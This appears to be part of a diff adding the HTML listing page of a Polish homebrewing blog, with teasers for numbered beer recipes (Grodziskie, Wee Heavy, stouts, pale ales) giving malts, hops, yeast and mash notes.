+                <p class="uk-article-lead" itemprop="description">Mocno niekonkretne, słodowe i wędzone żyto na Sybilli. Dodatki: chipsy dębowe. 26l, 13,5blg Skład Bursztynowy 30-70 EBC Strzegom 0,5 kg Caramunich (R) typ I 80-100 EBC Weyermann 0,2 kg Monachijski typ II 16-24 EBC Strzegom 1,4 kg Żytni wędzony 4,5 EBC Steinbach 1 kg Pale …</p>
+                <p>Mocno niekonkretne, słodowe i wędzone żyto na Sybilli. Dodatki: chipsy dębowe. 26l, 13,5blg Skład Bursztynowy 30-70 EBC Strzegom 0,5 kg Caramunich (R) typ I 80-100 EBC Weyermann 0,2 kg Monachijski typ II 16-24 EBC Strzegom 1,4 kg Żytni wędzony 4,5 EBC Steinbach 1 kg Pale Ale 5,5 - 7,5 EBC Strzegom 1 kg Special W 280 EBC Weyermann 0,3 kg Otręby orkiszowe - 200g Sybilla PL 2015 - 50 g granulat 6,0% aa Drożdże Safale S-04 Mech irlandzki - dwie łyżeczki Zacieranie Otręby skleikowane w 1,5l wody. 14 litrów wody jednotemperaturowo, infuzyjnie...</p>
+                <a href="/20-kundel-wedzone-zyto.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/19-wee-heavy.html" class="uk-article-title uk-link-muted" itemprop="name">19. Wee Heavy</a>
+                <p class="uk-article-meta"><time datetime="2016-02-05" itemprop="datePublished">pią 05 lutego 2016</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Klasyczne Wee Heavy z zestawu Centrum Piwowarstwa. 19blg. Dodatki: chipsy dębowe. Zmieniłem chmielenie z Marynki na Goldingsa i dodałem nieco Hallertauera, żeby podbić goryczkę (wyszło 26 litrów zamiast 20). 26l, 19blg Skład Słód pilzneński 3,7 kg Słód monachijski 2,2 kg Słód karmelowy jasny 0,5 kg Słód whisky …</p>
+                <p>Klasyczne Wee Heavy z zestawu Centrum Piwowarstwa. 19blg. Dodatki: chipsy dębowe. Zmieniłem chmielenie z Marynki na Goldingsa i dodałem nieco Hallertauera, żeby podbić goryczkę (wyszło 26 litrów zamiast 20). 26l, 19blg Skład Słód pilzneński 3,7 kg Słód monachijski 2,2 kg Słód karmelowy jasny 0,5 kg Słód whisky 0,4 kg Słód owsiany 0,4 kg Jęczmień palony 0,15 kg (w sumie 6.35kg) East Kent Goldings UK 2013 - 50 g granulat 5,7% aa Hallertauer Mittelfrüh DE 2013 15g Drożdże Safale S-04, z gęstwy po 18stce Mech irlandzki - dwie łyżeczki Zacieranie 22 litry...</p>
+                <a href="/19-wee-heavy.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/18-rauchalt.html" class="uk-article-title uk-link-muted" itemprop="name">18. Rauchalt</a>
+                <p class="uk-article-meta"><time datetime="2016-01-08" itemprop="datePublished">pią 08 stycznia 2016</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Celowałem w Rauchalta, ale postanowiłem wzbogacić go o kilka słodów bardziej karmelowych, podczas gdy wystarczyłby sam Monachijski oraz wędzony. Weyermann niestety okazał się w aromacie bardzo delikatny - nawet z dodatkowym kilogramem ten wędzonki, aromat nie byłby intensywny. Nieco na pewno wniesie za to Mesquite, który ma mocno wędzarniczy (kiełbasa jałowcowa …</p>
+                <p>Celowałem w Rauchalta, ale postanowiłem wzbogacić go o kilka słodów bardziej karmelowych, podczas gdy wystarczyłby sam Monachijski oraz wędzony. Weyermann niestety okazał się w aromacie bardzo delikatny - nawet z dodatkowym kilogramem ten wędzonki, aromat nie byłby intensywny. Nieco na pewno wniesie za to Mesquite, który ma mocno wędzarniczy (kiełbasa jałowcowa?) aromat. W małej ilości powinno to dać efekt nie tyle wędliny, co ogniska - a przynajmniej taki był zamiar. Chmielenie wyłączenie klasycznym niemieckim chmielem Hallertauer...</p>
+                <a href="/18-rauchalt.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/17-weizenbock.html" class="uk-article-title uk-link-muted" itemprop="name">17. Weizenbock</a>
+                <p class="uk-article-meta"><time datetime="2015-05-30" itemprop="datePublished">sob 30 maja 2015</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Klasyczny Weizenbock z zestawu Centrum Piwowarstwa. Czerwone kapsle bez podpisu.</p>
+                <p>Klasyczny Weizenbock z zestawu Centrum Piwowarstwa. Czerwone kapsle bez podpisu....</p>
+                <a href="/17-weizenbock.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/16-hefe-weizen.html" class="uk-article-title uk-link-muted" itemprop="name">16. Hefe Weizen</a>
+                <p class="uk-article-meta"><time datetime="2015-05-01" itemprop="datePublished">pią 01 maja 2015</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Klasyczny Hefe Weizen z zestawu Centrum Piwowarstwa. Pomarańczowe kapsle bez podpisu.</p>
+                <p>Klasyczny Hefe Weizen z zestawu Centrum Piwowarstwa. Pomarańczowe kapsle bez podpisu....</p>
+                <a href="/16-hefe-weizen.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/15-imperial-india-pale-ale-iipa-double-ipa-18o.html" class="uk-article-title uk-link-muted" itemprop="name">15. Imperial India Pale Ale - IIPA / Double IPA 18º</a>
+                <p class="uk-article-meta"><time datetime="2015-04-10" itemprop="datePublished">pią 10 kwietnia 2015</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Z zestawu z CP. Od siebie dodałem płatki owsiane i zmieniłem zacieranie na jednotemperaturowe. Planowana ilość: 20l Uzyskana ilość: Blg planowane: 10blg Blg po chmieleniu: 10blg Blg po fermentacji burzliwej: Blg po fermentacji cichej: Skład Słód pilzneński 4,2 kg Słód wiedeński 1 kg Słód monachijski typ II 0,6 …</p>
+                <p>Z zestawu z CP. Od siebie dodałem płatki owsiane i zmieniłem zacieranie na jednotemperaturowe. Planowana ilość: 20l Uzyskana ilość: Blg planowane: 10blg Blg po chmieleniu: 10blg Blg po fermentacji burzliwej: Blg po fermentacji cichej: Skład Słód pilzneński 4,2 kg Słód wiedeński 1 kg Słód monachijski typ II 0,6 kg Słód Caramunich typ I 0,2 kg Chmiel Warrior, granulat 20 g Chmiel Green Bullet, granulat 50 g Chmiel Centennial, granulat 30 g Chmiel Mosaic, granulat 100 g Mech irlandzki Płatki owsiane 200g Zacieranie 21l wody, infuzyjne jednotemperaturowe Filtracja/wysładzanie Gotowanie/Chmielenie Fermentacja Przelane na cichą z chmieleniem na zimno 2015-04-23. Butelkowanie 25l. Zabutelkowane...</p>
+                <a href="/15-imperial-india-pale-ale-iipa-double-ipa-18o.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/14-scottish-ale-10o-blg.html" class="uk-article-title uk-link-muted" itemprop="name">14. Scottish Ale 10º BLG</a>
+                <p class="uk-article-meta"><time datetime="2015-03-10" itemprop="datePublished">wto 10 marca 2015</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Lekki Scottish Ale z gotowego zestawu słódów z Centrum Piwowarstwa. Zależy mi na w miarę klasycznej interpretacji stylu, więc nie będę przy nim szczególnie kombinował. Planowana ilość: 20l Uzyskana ilość: 23l Blg planowane: 10blg Blg po chmieleniu: 10blg Blg po fermentacji burzliwej: Blg po fermentacji cichej: Skład Słód pilzneński 1 …</p>
+                <p>Lekki Scottish Ale z gotowego zestawu słódów z Centrum Piwowarstwa. Zależy mi na w miarę klasycznej interpretacji stylu, więc nie będę przy nim szczególnie kombinował. Planowana ilość: 20l Uzyskana ilość: 23l Blg planowane: 10blg Blg po chmieleniu: 10blg Blg po fermentacji burzliwej: Blg po fermentacji cichej: Skład Słód pilzneński 1,5 kg Słód monachijski 2,0 kg Słód karmelowy jasny 0,3 kg Słód wędzony Whisky 0,4 kg Jęczmień palony 0,05 kg Chmiel Goldings, granulat, 50 g Drożdże Safale S-04 z gęstwy Zacieranie 1.5 + 2 + 0.3 + 0.4 = 4.2kg 15l wody 50-52stopnie --...</p>
+                <a href="/14-scottish-ale-10o-blg.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/13-grycan-red-ale.html" class="uk-article-title uk-link-muted" itemprop="name">13. "Grycan" Red Ale</a>
+                <p class="uk-article-meta"><time datetime="2015-02-10" itemprop="datePublished">wto 10 lutego 2015</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Red Ale z dużym dodatkiem surowców niesłodowanych, przede wszystkim gryki, ale również jęczmienia, ryżu i prosa. Planowana ilość: 20l Uzyskana ilość: 26l Blg planowane: 14-16 Blg po chmieleniu: 15blg Blg po fermentacji burzliwej: Blg po fermentacji cichej: Skład Kasza gryczana -- 0.5kg Pęczak jęczmienny -- 0.3kg Kasza jaglana -- 0.1kg …</p>
+                <p>Red Ale z dużym dodatkiem surowców niesłodowanych, przede wszystkim gryki, ale również jęczmienia, ryżu i prosa. Planowana ilość: 20l Uzyskana ilość: 26l Blg planowane: 14-16 Blg po chmieleniu: 15blg Blg po fermentacji burzliwej: Blg po fermentacji cichej: Skład Kasza gryczana -- 0.5kg Pęczak jęczmienny -- 0.3kg Kasza jaglana -- 0.1kg Ryż biały -- 0.1kg Pale Ale 5,5 - 7,5 EBC Strzegom -- 5kg Karmelowy jasny 100-180 EBC Strzegom -- 0.5kg Special B 350 EBC Castle -- 0.5kg Marynka 2013 -- 30g Magnum 2012 -- 20g East Kent Goldings 2013 -- 15g Safale S04...</p>
+                <a href="/13-grycan-red-ale.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/12-zamkowy-coffe-stout.html" class="uk-article-title uk-link-muted" itemprop="name">12. "Zamkowy" Coffe Stout</a>
+                <p class="uk-article-meta"><time datetime="2014-11-10" itemprop="datePublished">pon 10 listopada 2014</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Coffe Stout (chocolate porter :)) na East Kent Goldings i Marynce. Planowana ilość: 20l Uzyskana ilość: 24l Blg planowane: 14-16 Blg po chmieleniu: 14 Blg po fermentacji burzliwej: ? Blg po fermentacji cichej: 5blg Skład Pęczak żytni -- 0.36kg Płatki owsiane -- 0.34kg Kawowy 480-520 EBC Castle -- 0,2 kg Jęczmień palony …</p>
+                <p>Coffe Stout (chocolate porter :)) na East Kent Goldings i Marynce. Planowana ilość: 20l Uzyskana ilość: 24l Blg planowane: 14-16 Blg po chmieleniu: 14 Blg po fermentacji burzliwej: ? Blg po fermentacji cichej: 5blg Skład Pęczak żytni -- 0.36kg Płatki owsiane -- 0.34kg Kawowy 480-520 EBC Castle -- 0,2 kg Jęczmień palony 1100 EBC Strzegom -- 0,2 kg Pale Ale 5,5 - 7,5 EBC Strzegom -- 4,5kg Karmelowy jasny 100-180 EBC Strzegom -- 0,2kg Special B 350 EBC Castle -- 0,2kg Marynka 2013 -- 20g East Kent Goldings 2013 -- 10g Safale...</p>
+                <a href="/12-zamkowy-coffe-stout.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/11-bag-end-brown-ale.html" class="uk-article-title uk-link-muted" itemprop="name">11. "Bag End" Brown Ale</a>
+                <p class="uk-article-meta"><time datetime="2014-09-07" itemprop="datePublished">nie 07 września 2014</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Brown ale East Kent Goldings i Marynce. Planowana ilość: 20l Uzyskana ilość: 25l Blg planowane: 12,5blg Blg po chmieleniu: 15 Blg po fermentacji burzliwej: 5 Blg po fermentacji cichej: 4 Skład Pęczak żytni -- 0.20kg Czekoladowy 900 EBC Castle -- 0,2kg Pale Ale 5,5 - 7,5 EBC Strzegom …</p>
+                <p>Brown ale East Kent Goldings i Marynce. Planowana ilość: 20l Uzyskana ilość: 25l Blg planowane: 12,5blg Blg po chmieleniu: 15 Blg po fermentacji burzliwej: 5 Blg po fermentacji cichej: 4 Skład Pęczak żytni -- 0.20kg Czekoladowy 900 EBC Castle -- 0,2kg Pale Ale 5,5 - 7,5 EBC Strzegom -- 4,5kg Karmelowy jasny 100-180 EBC Strzegom -- 0,3kg Special B 350 EBC Castle -- 0,3kg Marynka 2013 -- 20g East Kent Goldings 2013 -- 10g Safale S04 Mech irlandzki Chipsy dębowe Zacieranie 1l wody do żyta w celu skleikowania. 16l wody, infuzyjnie jednotemperaturowo przez 90 min...</p>
+                <a href="/11-bag-end-brown-ale.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/10-fangorn-pale-ale.html" class="uk-article-title uk-link-muted" itemprop="name">10. "Fangorn" Pale Ale</a>
+                <p class="uk-article-meta"><time datetime="2014-04-22" itemprop="datePublished">wto 22 kwietnia 2014</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Pale ale na Simcoe i Marynce Planowana ilość: 20l Uzyskana ilość: Blg planowane: 13blg Blg po chmieleniu: 13blg Blg po fermentacji burzliwej: Blg po fermentacji cichej: Skład Płatki owsiane -- 0.25kg Gryka -- 0.3kg Abbey 0.74kg Pale Ale 5,5 -- 7,5 EBC Strzegom - 4,4kg Marynka 2013 -- 15g …</p>
+                <p>Pale ale na Simcoe i Marynce Planowana ilość: 20l Uzyskana ilość: Blg planowane: 13blg Blg po chmieleniu: 13blg Blg po fermentacji burzliwej: Blg po fermentacji cichej: Skład Płatki owsiane -- 0.25kg Gryka -- 0.3kg Abbey 0.74kg Pale Ale 5,5 -- 7,5 EBC Strzegom - 4,4kg Marynka 2013 -- 15g Simcoe 2013 -- 50g Safale S04 -- trzecie użycie Zacieranie 1.5l wody do płatków i gryki w celu skleikowania. 17l wody, infuzyjnie jednotemperaturowo przez 90 min w 69 stopni. Filtracja/wysładzanie 10l = 2x3 1x4 Gotowanie/Chmielenie Marynka 15g x 60min Simcoe 15g x 20min Simcoe 35g x 10min Pożywka 1 łyżeczka Fermentacja Butelkowanie...</p>
+                <a href="/10-fangorn-pale-ale.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/9-piwo-baskervielleow-scottish-ale.html" class="uk-article-title uk-link-muted" itemprop="name">9. "Piwo Baskervielle'ów" Scottish ale</a>
+                <p class="uk-article-meta"><time datetime="2014-03-22" itemprop="datePublished">sob 22 marca 2014</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Lekki szkocki ale Planowana ilość: 20l Uzyskana ilość: 35 butelek Blg planowane: 10-11blg Blg po chmieleniu: 10blg Blg po fermentacji burzliwej: 3,3blg Blg po fermentacji cichej: ok 3blg Skład Pale Ale 5,5 -- 7,5 EBC Strzegom - 2kg Abbey 0.3kg Słód wędzony Whisky 1kg Marynka 2012 -- 15g Safale …</p>
+                <p>Lekki szkocki ale Planowana ilość: 20l Uzyskana ilość: 35 butelek Blg planowane: 10-11blg Blg po chmieleniu: 10blg Blg po fermentacji burzliwej: 3,3blg Blg po fermentacji cichej: ok 3blg Skład Pale Ale 5,5 -- 7,5 EBC Strzegom - 2kg Abbey 0.3kg Słód wędzony Whisky 1kg Marynka 2012 -- 15g Safale S04 -- drugie użycie Zacieranie 10l wody, infuzyjnie jednotemperaturowo przez 90 min w 69 stopni. Filtracja/wysładzanie 12l = 3x4l Gotowanie/Chmielenie Magnum 20g x 60min Marynka 10g x 60min Kazbek 10g x 15min Kazbek 12g x 5min Kazbek 28g x 7dni na cichej Fermentacja Drożdże z gęstwy zadane dzień po warzeniu...</p>
+                <a href="/9-piwo-baskervielleow-scottish-ale.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/8-bursztyn-pale-ale.html" class="uk-article-title uk-link-muted" itemprop="name">8. "Bursztyn" Pale Ale</a>
+                <p class="uk-article-meta"><time datetime="2014-02-07" itemprop="datePublished">pią 07 lutego 2014</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Bursztynowy pale ale w celu przetestowania chmielu Kazbek Planowana ilość: 20l Uzyskana ilość: 24l Blg planowane: 12-13blg Blg po chmieleniu: 14glb Blg po fermentacji burzliwej: Blg po fermentacji cichej: Skład Pale Ale 5,5 - 7,5 EBC Strzegom - 3,5kg Bursztynowy 1kg Magnum 2012 - 20g Kazbek 50g Marynka 10g Safale …</p>
+                <p>Bursztynowy pale ale w celu przetestowania chmielu Kazbek Planowana ilość: 20l Uzyskana ilość: 24l Blg planowane: 12-13blg Blg po chmieleniu: 14glb Blg po fermentacji burzliwej: Blg po fermentacji cichej: Skład Pale Ale 5,5 - 7,5 EBC Strzegom - 3,5kg Bursztynowy 1kg Magnum 2012 - 20g Kazbek 50g Marynka 10g Safale S04 Zacieranie 15l wody, infuzyjnie jednotemperaturowo przez 90 min w 69 stopni. Filtracja/wysładzanie 12l = 3x4l Gotowanie/Chmielenie Magnum 20g x 60min Marynka 10g x 60min Kazbek 10g x 15min Kazbek 12g x 5min Kazbek 28g x 7dni na cichej Fermentacja Od 8 marca...</p>
+                <a href="/8-bursztyn-pale-ale.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/7-jason-voorhes-pumpkin-pie-ale.html" class="uk-article-title uk-link-muted" itemprop="name">7. "Jason Voorhes" Pumpkin pie Ale</a>
+                <p class="uk-article-meta"><time datetime="2013-11-01" itemprop="datePublished">pią 01 listopada 2013</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Pumpkin ale własnego przepisu. Z pieczoną dynią, przyprawami, na słodko. Planowana ilość: 20l Uzyskana ilość: Blg planowane: 12-13blg Blg po chmieleniu: Blg po fermentacji burzliwej: Blg po fermentacji cichej: Skład Pale Ale 5,5 - 7,5 EBC Strzegom - 4kg Biscuit 50 EBC Castle 0,2 kg Melanoidynowy jasny 40 EBC …</p>
+                <p>Pumpkin ale własnego przepisu. Z pieczoną dynią, przyprawami, na słodko. Planowana ilość: 20l Uzyskana ilość: Blg planowane: 12-13blg Blg po chmieleniu: Blg po fermentacji burzliwej: Blg po fermentacji cichej: Skład Pale Ale 5,5 - 7,5 EBC Strzegom - 4kg Biscuit 50 EBC Castle 0,2 kg Melanoidynowy jasny 40 EBC Castle 0,2 kg Pieczona dynia z cukrem: 1,5kg Przyprawy: cynamon, imbir, gałka muszkatałowa, kardamon, ziele angielskie Marynka 20g MauriBrew ALE - Y514 - z poprzedniej warki Zacieranie 4 + 0,2 + 0,2 + 1,5 =~ 6kg x 3 = 18l. Dam 17l....</p>
+                <a href="/7-jason-voorhes-pumpkin-pie-ale.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/6-czarny-eliksir-dry-stout.html" class="uk-article-title uk-link-muted" itemprop="name">6. "Czarny eliksir" Dry Stout</a>
+                <p class="uk-article-meta"><time datetime="2013-10-11" itemprop="datePublished">pią 11 października 2013</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Dry stout własnego przepisu. Nieco w stronę czekoladowego i owsianego, miał być czymś w środek. Planowana ilość: 20l Uzyskana ilość: 26l Blg planowane: 12-13blg Blg po chmieleniu: 13,5 blg Blg po fermentacji burzliwej: 3,5blg Blg po fermentacji cichej: Skład Pale Ale 5,5 - 7,5 EBC Strzegom - 5kg …</p>
+                <p>Dry stout własnego przepisu. Nieco w stronę czekoladowego i owsianego, miał być czymś w środek. Planowana ilość: 20l Uzyskana ilość: 26l Blg planowane: 12-13blg Blg po chmieleniu: 13,5 blg Blg po fermentacji burzliwej: 3,5blg Blg po fermentacji cichej: Skład Pale Ale 5,5 - 7,5 EBC Strzegom - 5kg Czekoladowy jasny 350-450 EBC Strzegom 0,2 kg Barwiący 1300-1600 EBC Strzegom - 0,2 kg Płatki gryczane - 50g Płatki żytnie - 50g Płatki owsiane 200g Jęczmień palony 1100 EBC Strzegom - 0,2 kg East Kent Goldings 2012 - 50 g granulat Tetnager 30g MauriBrew...</p>
+                <a href="/6-czarny-eliksir-dry-stout.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/5-sekret-mnicha-witbier.html" class="uk-article-title uk-link-muted" itemprop="name">5. "Sekret mnicha" Witbier</a>
+                <p class="uk-article-meta"><time datetime="2013-07-22" itemprop="datePublished">pon 22 lipca 2013</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Witbier według receptury Centrum Piwowarstwa Planowana ilość: 20l Uzyskana ilość: 16,5l Blg planowane: 11,5blg Blg po chmieleniu: 11blg Blg po fermentacji burzliwej: 3blg Blg po fermentacji cichej: - Skład słód pilzneński 2 kg pszenica niesłodowana 1,8 kg płatki owsiane 0,4 kg kolendra 15 g Curaçao 20 g …</p>
+                <p>Witbier według receptury Centrum Piwowarstwa Planowana ilość: 20l Uzyskana ilość: 16,5l Blg planowane: 11,5blg Blg po chmieleniu: 11blg Blg po fermentacji burzliwej: 3blg Blg po fermentacji cichej: - Skład słód pilzneński 2 kg pszenica niesłodowana 1,8 kg płatki owsiane 0,4 kg kolendra 15 g Curaçao 20 g Skórka jednej świeżej pomarańczy Sok z jednej świeżej pomarańczy Chmiel Lubelski, granulat, 25 g Chmiel Tettanger, 20g Zacieranie 4,2kg zasypu x 3 + 2 = 15l wody do zacierania Filtracja/wysładzanie 20 - 15 + 2 + (15/3) = 11l wody = 4 + 4 + 3 Gotowanie/Chmielenie Lubelski na...</p>
+                <a href="/5-sekret-mnicha-witbier.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/4-rajskie-piwo-gryczany-ale.html" class="uk-article-title uk-link-muted" itemprop="name">4. "Rajskie piwo" Gryczany Ale</a>
+                <p class="uk-article-meta"><time datetime="2013-06-22" itemprop="datePublished">sob 22 czerwca 2013</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Gryczany ale na ekstrakcie, miodzie i płatkach Planowana ilość: 20l Uzyskana ilość: Blg planowane: 12blg Blg po chmieleniu: 12blg Blg po fermentacji burzliwej: 2blg Blg po fermentacji cichej: Skład Syrop słodowy Lager chmielony -- 1 puszka Miód gryczany 0,45l Płatki gryczane błyskawiczne 0,8kg Sacharoza 0,5kg Drożdże Safbrew WB-06 …</p>
+                <p>Gryczany ale na ekstrakcie, miodzie i płatkach Planowana ilość: 20l Uzyskana ilość: Blg planowane: 12blg Blg po chmieleniu: 12blg Blg po fermentacji burzliwej: 2blg Blg po fermentacji cichej: Skład Syrop słodowy Lager chmielony -- 1 puszka Miód gryczany 0,45l Płatki gryczane błyskawiczne 0,8kg Sacharoza 0,5kg Drożdże Safbrew WB-06 - ok szklanki gęstwy z #2 Mech irlandzki - dwie łyżeczki Pożywka dla drożdży - dwie łyżeczki Zacieranie Płaki gotowane i wysłodzone kilkakrotnym przelewaniem przez nie wody. Uzupełnione do 20l i dodanie syropu słodowego. Gotowanie przez ok 10min. Dodanie mchu i pożywki, po...</p>
+                <a href="/4-rajskie-piwo-gryczany-ale.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/3-piwo-siostry-faustyny-zytnie.html" class="uk-article-title uk-link-muted" itemprop="name">3. "Piwo siostry Faustyny" Żytnie</a>
+                <p class="uk-article-meta"><time datetime="2013-06-01" itemprop="datePublished">sob 01 czerwca 2013</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Żytnie z zestawu Centrum Piwowarstwa. Planowana ilość: 20l Uzyskana ilość: 14,5l Blg planowane: 12blg Blg po chmieleniu: 13blg Blg po fermentacji burzliwej: 5blg Blg po fermentacji cichej: 4,5blg Skład Słód żytni 2,2 kg Słód pilzneński 1 kg Słód monachijski 0,8 kg Słód karmelowy jasny 0,2 …</p>
+                <p>Żytnie z zestawu Centrum Piwowarstwa. Planowana ilość: 20l Uzyskana ilość: 14,5l Blg planowane: 12blg Blg po chmieleniu: 13blg Blg po fermentacji burzliwej: 5blg Blg po fermentacji cichej: 4,5blg Skład Słód żytni 2,2 kg Słód pilzneński 1 kg Słód monachijski 0,8 kg Słód karmelowy jasny 0,2 kg = 4,2kg słodu Chmiel Lubelski, granulat, 25 g Drożdże Safbrew WB-06 Mech irlandzki - dwie łyżeczki Pożywka dla drożdży - dwie łyżeczki Zacieranie Zacieranie dekokcyjne w 15l wody. Filtracja/wysładzanie Wysładzamy 3 razy po 4 litry. - Taki był plan. Ostatecznie do kiepsko filtrującej się brzeczki wlałem jednorazowo 12l...</p>
+                <a href="/3-piwo-siostry-faustyny-zytnie.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/2-strong-scotch-ale-moryjskie.html" class="uk-article-title uk-link-muted" itemprop="name">2. Strong Scotch Ale "Moryjskie"</a>
+                <p class="uk-article-meta"><time datetime="2013-05-30" itemprop="datePublished">czw 30 maja 2013</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Strong Scotch Ale (Wee Heavy) z zestawu Centrum Piwowarstwa. Planowana ilość: 20l Uzyskana ilość: 22l Blg planowane: 19blg Blg po chmieleniu: 18,5blg Blg po fermentacji burzliwej: 5blg Skład Słód pilzneński 3,5 kg Słód monachijski 2 kg Słód karmelowy jasny 0,3 kg Słód whisky 0,2 kg Słód …</p>
+                <p>Strong Scotch Ale (Wee Heavy) z zestawu Centrum Piwowarstwa. Planowana ilość: 20l Uzyskana ilość: 22l Blg planowane: 19blg Blg po chmieleniu: 18,5blg Blg po fermentacji burzliwej: 5blg Skład Słód pilzneński 3,5 kg Słód monachijski 2 kg Słód karmelowy jasny 0,3 kg Słód whisky 0,2 kg Słód owsiany 0,2 kg Jęczmień palony 0,15 kg (w sumie 6.35kg) Chmiel Marynka, granulat, 30 g Drożdże Safale S-04 Mech irlandzki - dwie łyżeczki Pożywka dla drożdży - dwie łyżeczki Zacieranie 6.35 x 3 = 19.05 l wody Wrzucamy słód do wody o temperaturze ok 68 stopni i ustalamy...</p>
+                <a href="/2-strong-scotch-ale-moryjskie.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/1-grodziskie-osada-dymow.html" class="uk-article-title uk-link-muted" itemprop="name">1. Grodziskie "Osada dymów"</a>
+                <p class="uk-article-meta"><time datetime="2013-05-10" itemprop="datePublished">pią 10 maja 2013</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Piwo grodziskie na bazie zestawu kupionego w Centrum piwowarstwa. Data nastawienia: 2013-05-11 Data butelkowania: 2013-05-27 Litraż: ~21l --- do butelek trafiło tylko ok 13 litrów -- reszta gdzieś zniknęła w trakcie. Skład Słód pszeniczny 1,30 kg Słód wędzony 0,70 kg Słód pilzneński 0,50 kg Chmiel Lubelski, granulat, 50 g …</p>
